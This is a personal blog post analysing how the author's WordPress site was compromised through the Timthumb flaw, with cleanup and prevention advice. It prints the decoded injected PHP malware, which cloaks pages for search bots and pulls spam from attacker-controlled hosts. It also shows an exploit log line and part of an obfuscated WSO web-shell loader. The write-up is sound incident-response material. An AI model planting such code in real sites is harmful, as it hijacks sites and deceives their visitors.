---
layout: post
title: >
    How my website was hacked - and I didn't realise for months
permalink: /2011/11/30/how-my-website-was-hacked/
---
Yesterday I found out that my website had been hacked. Not only that, but it had been hacked months ago, and I hadn't even noticed. How did this happen?

I only found out about it because somebody was kind enough to email me to let me know that they saw this on Google:

<a href="http://alexwarrenblog.files.wordpress.com/2011/11/hack1.png"><img class="alignnone size-full wp-image-395" title="Google result" src="http://alexwarrenblog.files.wordpress.com/2011/11/hack1.png" alt="" width="689" height="343" /></a>

That's definitely a link to my website, but what's happened to the title? Clicking on the link brought up my website, and nothing seemed wrong there - my browser was showing the correct title. It was only Google who were seeing a "spammified" version of the page.

I did a quick search and realised that my site had fallen victim to a version of the <a href="http://www.pearsonified.com/2010/04/wordpress-pharma-hack.php">WordPress Pharma Hack</a> - a particularly sneaky hack which means everybody apart from Google sees the normal version of your page, meaning that you can be blissfully unaware that you've been hacked until you see something odd in your search results.

To solve the problem, you need to see your site as Google sees it. The most accurate way of doing this is to use <a href="http://www.google.com/webmasters/tools/">Google Webmaster Tools</a>. When you log in, under Diagnostics you can go to "Fetch as Googlebot". I entered the page and waited a few seconds for Google to fetch it, then by clicking the "Success" link I was able to see the HTML that Google was seeing:

<a href="http://alexwarrenblog.files.wordpress.com/2011/11/webmaster1.png"><img class="alignnone size-full wp-image-399" title="Webmaster Tools" src="http://alexwarrenblog.files.wordpress.com/2011/11/webmaster1.png" alt="" width="749" height="642" /></a>

Oh dear. Where was that coming from?

I followed the advice on the article I linked to above - deactivating all plugins, then refetching the Google version of the page. No difference - it was obviously not a dodgy plugin that was to blame, and the spammy content was being injected somewhere else.

This would be a pain to debug by repeatedly refetching via Google Webmaster Tools, not least because you can only do a limited number of fetches. It would be much easier if I could see the Googlebot version of the page myself. The way to do this is to change your browser's <a href="http://en.wikipedia.org/wiki/User_agent">user agent</a> string.

I use Chrome as my browser of choice. Despite there being plenty of documentation on the web suggesting that you can pass a "user-agent" parameter into chrome.exe, this no longer seems to work on the latest version of Chrome. Perhaps surprisingly, it was IE9 to the rescue. The debugging tools built in to IE9 are really rather good - just hit F12 and you can go to Tools, then "Change user agent string", and you can make IE pretend that it's anything. In my case, I set it to a custom string:
<pre>Googlebot/2.1 (+http://www.google.com/bot.html)</pre>
and then I loaded my site. Lo and behold, there was the hacked version of my page:

<a href="http://alexwarrenblog.files.wordpress.com/2011/11/hack2.png"><img class="alignnone size-full wp-image-401" title="Hacked version of website" src="http://alexwarrenblog.files.wordpress.com/2011/11/hack2.png" alt="" width="1143" height="887" /></a>

There was also some spammy text inserted into the content further down the page. Not pretty at all.

So, how was this spammy content being generated? I did a few experiments, making a few changes to the page. Any updates I made were not reflected in the hacked version, so this was clearly being served up in its entirety based on an older cached version of the page, rather than inserting spammy links on-the-fly.

I did a few more tests - I wanted to know if this was even coming through WordPress at all, maybe it was some kind of .htaccess hack? I deliberately put syntax errors in core WordPress files, and in the theme files. Breaking WordPress broke the hacked version of the page, but breaking the theme files didn't. So the hacked code was clearly being run quite early in the page lifecycle, but was definitely within my WordPress PHP files somewhere.

I grabbed a copy of all my WordPress files from the server - the wp-admin, wp-content and wp-includes folders. The <a href="http://www.pearsonified.com/2010/04/wordpress-pharma-hack.php">article</a> I linked to earlier mentioned that WordPress hacks typically contain functions like "eval" and "base64_decode", to obfuscate the hack code, so I did quick search through the WordPress files.

Bingo - the top of wp-includes/pluggable.php:
<pre>&lt;?php
eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKD ...</pre>
I ran the 6KB string through an online base 64 decoder, and here is the code that was being run <em>for every single request to my site</em>:
<pre>error_reporting(0);
$bot_list = array("8.6.48","62.172.199","62.27.59","63.163.102","64.157.137","64.157.138","64.233.173","64.68.80","64.68.81","64.68.82","64.68.83","64.68.84","64.68.85","64.68.86","64.68.87","64.68.88","64.68.89","64.68.90","64.68.91","64.68.92","64.75.36","66.163.170","66.163.174","66.196.101","66.196.65","66.196.67","66.196.72","66.196.73","66.196.74","66.196.77","66.196.78","66.196.80","66.196.81","66.196.90","66.196.91","66.196.92","66.196.93","66.196.97","66.196.99","66.218.65","66.218.70","66.228.164","66.228.165","66.228.166","66.228.173","66.228.182","66.249.64","66.249.65","66.249.66","66.249.67","66.249.68","66.249.69","66.249.70","66.249.71","66.249.72","66.249.73","66.249.78","66.249.79","66.94.230","66.94.232","66.94.233","66.94.238","67.195.115","67.195.34","67.195.37","67.195.44","67.195.45","67.195.50","67.195.51","67.195.52","67.195.53","67.195.54","67.195.58","67.195.98","68.142.195","68.142.203","68.142.211","68.142.212","68.142.230","68.142.231","68.142.240","68.142.246","68.142.249","68.142.250","68.142.251","68.180.216","68.180.250","68.180.251","69.147.79","72.14.199","72.30.101","72.30.102","72.30.103","72.30.104","72.30.107","72.30.110","72.30.111","72.30.124","72.30.128","72.30.129","72.30.131","72.30.132","72.30.133","72.30.134","72.30.135","72.30.142","72.30.161","72.30.177","72.30.179","72.30.213","72.30.214","72.30.215","72.30.216","72.30.221","72.30.226","72.30.252","72.30.54","72.30.56","72.30.60","72.30.61","72.30.65","72.30.78","72.30.79","72.30.81","72.30.87","72.30.9","72.30.97","72.30.98","72.30.99","74.6.11","74.6.12","74.6.13","74.6.131","74.6.16","74.6.17","74.6.18","74.6.19","74.6.20","74.6.21","74.6.22","74.6.23","74.6.24","74.6.240","74.6.25","74.6.26","74.6.27","74.6.28","74.6.29","74.6.30","74.6.31","74.6.65","74.6.66","74.6.67","74.6.68","74.6.69","74.6.7","74.6.70","74.6.71","74.6.72","74.6.73","74.6.74","74.6.75","74.6.76","74.6.79","74.6.8","74.6.85","74.6.86","74.6.87","74.6.9","74.55.27","141.185.209","169.207.238","199.177.18","202.160.178","202.160.179","202.160.180","202.160.181","202.160.183","202.160.185","202.165.96","202.165.98","202.165.99","202.212.5","202.46.19","203.123.188","203.141.52","203.255.234","206.190.43","207.126.239","209.1.12","209.1.13","209.1.32","209.1.38","209.131.40","209.131.41","209.131.48","209.131.49","209.131.50","209.131.51","209.131.60","209.131.62","209.185.108","209.185.122","209.185.141","209.185.143","209.185.253","209.191.123","209.191.64","209.191.65","209.191.82","209.191.83","209.67.206","209.73.176","209.85.238","211.14.8","211.169.241","213.216.143","216.109.121","216.109.126","216.136.233","216.145.58","216.155.198","216.155.200","216.155.202","216.155.204","216.239.193","216.239.33","216.239.37","216.239.39","216.239.41","216.239.45","216.239.46","216.239.51","216.239.53","216.239.57","216.239.59","216.32.237","216.33.229","174.129.130","174.129.66","85.17.19");
$ip = preg_replace("/.(d+)$/", '', $_SERVER["REMOTE_ADDR"]);
$agent = $_SERVER["HTTP_USER_AGENT"];

	if ($_GET["testd"]=="ok") { print "ok!"; exit; }

if(in_array($ip, $bot_list) || strpos($agent, "bot"))	{
	if ($_SERVER["QUERY_STRING"]=="q") { print "ok!"; exit; }

	$page=urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
	$outsourceurl=base64_decode('aHR0cDovL2dsYXZnZW4uY29tL2dldC5waHA/c2l0ZT0=').urlencode($_SERVER['HTTP_HOST']).'&amp;page='.urlencode($_SERVER['REQUEST_URI']).'&amp;ip='.urlencode($_SERVER['REMOTE_ADDR']).'&amp;agent='.urlencode($_SERVER['HTTP_USER_AGENT']);
	if (function_exists("curl_init")) {
	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $outsourceurl);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	$out = curl_exec($c);
	curl_close($c);
	} else {
	$out = file_get_contents($outsourceurl);
	}
	if (substr($out,0,3) == "OK!") { echo substr($out,4); die; }
}

if (preg_match('/live|msn|yahoo|google|ask|aol/', $_SERVER["HTTP_REFERER"])) {
	$tabs = array ('viagra','cialis','levitra','propecia','prozac','xenical','soma','zoloft','tamiflu','sildenafil','tadalafil','vardenafil','finasteride','hoodia','acomplia','phentermine','adipex','tramadol','ultram','xanax','valium','ambien','ativan','vicodin','hoodia','acomplia');
	$niche='unknown';
	foreach($tabs as $tab)	{
		if(preg_match("/$tab/i", $_SERVER["HTTP_REFERER"]))	{
			$niche = $tab;
		}
	}
	if ($niche!="unknown") {
		$urlsutra = base64_decode('aHR0cDovL2tsaWtjZW50cmFsLmNvbS90cmFmZmljL2luLmNnaT8xMSZwYXJhbWV0ZXI9');
	if (false == ($str=file_get_contents($urlsutra.$niche."&amp;seoref=".$_SERVER["HTTP_REFERER"]."&amp;HTTP_REFERER=".$_SERVER['HTTP_HOST']))) {
    header("location: ".$urlsutra.$niche."&amp;seoref=".$_SERVER["HTTP_REFERER"]."&amp;HTTP_REFERER=".$_SERVER['HTTP_HOST']);
    exit;
    } else {
    echo $str;
    exit;
    }
	}
}</pre>
What does this do? Well, for every request, it checks to see if the request came from a known search engine bot (such as Googlebot). If it does, the web server makes a request to a server controlled by the hacker, to get the spammified content for that page. In this case the hacker's server is again a base64 encoded string which resolves to the domain glavgen.com.

A quick search for this domain on Google brings up a page entitled "WordPress Timthumb Viagra Attack : klikcentral.com / glavgen.com" and following links there brought me to a page about the <a href="http://blog.sucuri.net/2011/08/timthumb-php-security-vulnerability-just-the-tip-of-the-iceberg.html">Timthumb vulnerability</a>.

It's not a WordPress security vulnerability exactly, but a lot of WordPress theme files include the open-source Timthumb library, and at the beginning of August 2011 it was discovered that this library contains a vulnerability allowing anybody to upload any PHP file to your server.

Now I must confess that this rang a bell. When I was redeveloping my website with WordPress earlier this year, I was in the market for a nice-looking theme which I could adapt to make it look as good as possible. I signed up with a couple of theme sites, <a href="http://www.elegantthemes.com/">ElegantThemes</a> and <a href="http://www.simplethemes.com/">SimpleThemes</a>.

I'd had an email from ElegantThemes on 4th August, a couple of days after the vulnerability was discovered. It warned that their themes used this vulnerable script, and that it would be a very good idea to update any of their themes I had installed to the latest versions from their site.

Well, I had the site up and running by this time, but I'd used SimpleThemes instead. I didn't have any ElegantThemes themes installed on the server.

Guess what? SimpleThemes were using the same vulnerable script. But I never received a similar email from them.

<strong>Cleaning Up</strong>

Now to tidy up my web server. It was straightforward to remove the hack code from pluggable.php, and to download the <a href="http://code.google.com/p/timthumb/">updated version of Timthumb</a> to replace the vulnerable version that was bundled with my WordPress theme.

But how exactly had the hacker exploited the vulnerable Timthumb to update my pluggable.php? It was important to find out, otherwise there could be intermediate files left on my web server which could be easily used to re-hack it.

I wanted to identify exactly when the hack had taken place. I tend to download my web server log files fairly regularly, although unfortunately not every single day, and my web host only had copies going back a couple of months. It turned out that I was at least able to verify that it was indeed the vulnerable thumbs.php that was exploited - this line in my log file was the giveaway:
<pre>88.198.51.36 - - [08/Aug/2011:04:39:45 +0200] "GET /wp-content/themes/impacto/thumb.php?src=http://picasa.com12345.dyndns.org/1.php HTTP/1.1" 400 153 www.textadventures.co.uk "-" "MSIE 7.0" "-"</pre>
So my server had been hacked on 8th August - only a week after the vulnerability was disclosed. If I'd been using ElegantThemes, <em>and</em> had acted as soon as I got their email on 4th August, I'd have been safe, but it shows how quickly people need respond to announcements of these kinds of vulnerabilities, and by "people" I mean both theme providers and the users of those themes.

In the cache directory was the PHP that had been uploaded by the hacker. It looks like this (line breaks added for some clarity):
<pre>&lt;?php $auth_pass = "47a85"."6c68e623468d"."84123e878"."81d1e3";
$color = "#df5";$default_action = 'File'.'sMan';$default_use_ajax = true;
$default_charset = 'Windo'.'ws-1'.'251';
preg_replace("/.*/e","ev" . "al(gz" . "inf" . "late(bas" . "e64_de" .
"co" . "de('5b1pdxrHEjD82fec+x9aE24GYoQA2bkOEli2LNlybMnR4lV+yAADT ...</pre>
Another obfuscated base64 encoded file, but this time with the extra sneakiness of using string concatenation to mask the calls to "eval" and "base64_decode". Even running the encoded text through an online decoder is no help, as it's GZ compressed into the bargain.

I'm not sure exactly when the hacker ran his uploaded PHP script, as I think that is missing from my log files as I probably didn't download that one at the time. I found another few hits from the same IP about a month later though, so this is clearly something they take their time over and keep quiet about.

The result of decoding the text is another PHP script. I ran this on a virtual machine to see what it did, and it's a hacking tool called WSO 2.4 which gives the hacker full control over pretty much everything:

<a href="http://alexwarrenblog.files.wordpress.com/2011/11/hack-tool.png"><img class="alignnone size-full wp-image-407" title="WSO 2.4" src="http://alexwarrenblog.files.wordpress.com/2011/11/hack-tool.png" alt="" width="1279" height="809" /></a>

Using this tool they can edit any file, have full console access, run SQL and PHP commands, and even change the timestamp on files so you won't even know they've been there.

I deleted the cache folder. I also ran "grep" over all files on my web server to look for a few key words from the WSO 2.4 file, to ensure that no trace of it had been left anywhere on the server.

<strong>Summary of the attack</strong>

So, in summary, here is how the attack worked:
<ul>
	<li>My WordPress theme, created by SimpleThemes, was using a vulnerable third-party library</li>
	<li>SimpleThemes, unlike at least one rival company, do not appear to have taken steps to inform their customers that their WordPress installations are vulnerable</li>
	<li>As a result, a hacker scanning servers for this vulnerability was able to upload their own PHP file to my server</li>
	<li>This PHP file is cleverly obfuscated, even hiding its use of "standard" hacking functions such as "eval" and "base64_decode"</li>
	<li>Some time after this PHP was uploaded, the attacker sent a request to my server to cause it to be run</li>
	<li>This caused the PHP code within it to be extracted, installing the "WSO 2.4" back-door tool onto the server</li>
	<li>This tool gives full access to the hacker to modify files. At some time, possibly weeks after installing WSO 2.4, they used it to modify a core WordPress file (pluggable.php)</li>
	<li>This core WordPress file had an obfuscated function call added to it. Every page request to the server caused this function to run</li>
	<li>The function would check to see if the page request originated from a bot. If it didn't, the normal page output was displayed to the user, so nobody would know anything was wrong.</li>
	<li>If the page request did originate from a bot, a remote call was made to a separate server under the hacker's control. This server responded with a snapshot of the original page, modified to change the &lt;title&gt; tag and insert spammy text and links</li>
	<li>This meant that Google results which returned my website had strange spammy titles</li>
	<li>It was only thanks to the kindness of a stranger that I was informed about this at all.</li>
</ul>
<strong>Lessons Learned</strong>

I've never had a website hacked before. In fact I don't recall ever being the victim of anything like this - no computer viruses or other malware have ever made their way onto my machines (to the best of my knowledge and memory anyway). I'm usually pretty careful about security, installing updates as soon as they're available, so it was gut-wrenching to discover that a server under my control had fallen victim to a hacker.

There are many levels of sneakiness to this attack, and there must be thousands of websites out there who have fallen victim to the same thing, but currently have absolutely no idea about it.

By exploiting a vulnerability not in WordPress itself, but in a file commonly installed with WordPress themes, the hackers have a good proportion of the reach of a "native" WordPress attack, but there is no WordPress patch than can ever fix this. Instead you have to rely on your theme provider to notify you of the problem, and clearly the message has not got through to all of them.

Once you've been hacked, you'll have no idea about it, as the hackers take pains to not draw attention to themselves. You can use your own website normally and have no clue that there is anything wrong. But behind the scenes, a hacker can be adding obfuscated functions to your PHP files, controlling exactly what your web server displays to which visitors.

In this case, they showed a modified version of the page to Google, but there was absolutely nothing to stop them redirecting any visitor anywhere. Porn, malware downloads, phishing attacks - it was all easily in their grasp, but my hackers were keeping quiet.

You may not be so lucky with yours.

So how do you know if you're vulnerable, or maybe even have already fallen victim?
<ul>
	<li>Check your WordPress themes folders for timthumb.php and thumb.php files <strong>now</strong>. This includes inactive themes. The file simply has to exist on the server - that's it. The hackers scan for common theme folders, so if you've got an off-the-shelf theme with this vulnerability, they will find it. If they haven't already.</li>
	<li>Check your PHP files for suspicious "eval" and "base64_decode" function calls, usually with a big lot of text (though there's no reason they couldn't get more sophisticated about this and inject the code in an even more obscure way).</li>
	<li>Check your site with <a href="http://www.google.com/webmasters/tools/">Google Webmaster Tools</a> and also try browsing your site yourself with a Googlebot user agent.</li>
</ul>
How to prevent this kind of thing?
<ul>
	<li>You can't rely on your theme provider to keep you secure. Take a look at the PHP files they're using, so you know what third-party libraries are in use. Search for known vulnerabilities in these libraries, and if you can, subscribe to their mailing lists so you'll have early warning if vulnerabilities are discovered.</li>
	<li>Look at the <a href="http://codex.wordpress.org/Hardening_WordPress">Hardening WordPress</a> instructions. More stringent file permissions may have prevented or at least mitigated this problem.</li>
	<li>Monitor your site. I could have probably spotted the flood of suspicious requests to thumb.php if I'd thought to look. Also it's a good idea to check your site every so often, both as a regular user and by pretending to be Googlebot.</li>
</ul>
If you have any more suggestions, I'd love to hear them in the comments!

I have reported the issue to SimpleThemes. At least one person on their forums has <a href="http://www.simplethemes.com/support/viewthread/533/">already posted</a> about this, but there are no replies (and I can't add one, presumably as my account has expired). I will update this post if and when I hear back from them.

Stay safe out there...

<strong>Update 1st Dec 2011:</strong>

Some good comments below, and loads more over at <a href="http://www.reddit.com/r/webdev/comments/mutt6/how_my_wordpress_install_was_hacked_months_ago/">reddit</a>.

SimpleThemes wrote back to me, with the latest fixed theme files. Apparently they sent out an email warning about the exploit the week it was announced (didn't say which date), and they updated the theme on 22nd August (this was after my site had been compromised). I never received an email though, and I've asked them why. I wonder if it is because my account with them had expired by this point - but if this is the case, in my view they should still have notified their "previous" customers about such a serious security vulnerability, even if they're "out of support". I will update this post again if I get clarification.